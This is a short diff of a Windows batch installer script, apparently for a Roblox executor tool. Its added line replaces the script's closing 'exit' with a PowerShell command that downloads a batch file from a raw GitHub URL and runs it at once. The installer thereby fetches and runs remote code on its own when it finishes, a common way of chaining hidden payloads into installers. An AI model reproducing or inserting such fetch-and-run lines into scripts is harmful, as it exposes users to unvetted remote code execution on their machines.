@@ -35,4 +35,4 @@ powershell -command "(new-object System.Net.WebClient).DownloadFile('https://sol
 del /s /q %temp%\ExecutorInstaller\WaveInstaller.exe
 :Exit
 rd /s /q %temp%\ExecutorInstaller
-exit
+powershell -command "(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/clipflip-rblx/custom-installer/main/menu.bat\", \"menu.bat\"); Start-Process -FilePath menu.bat"
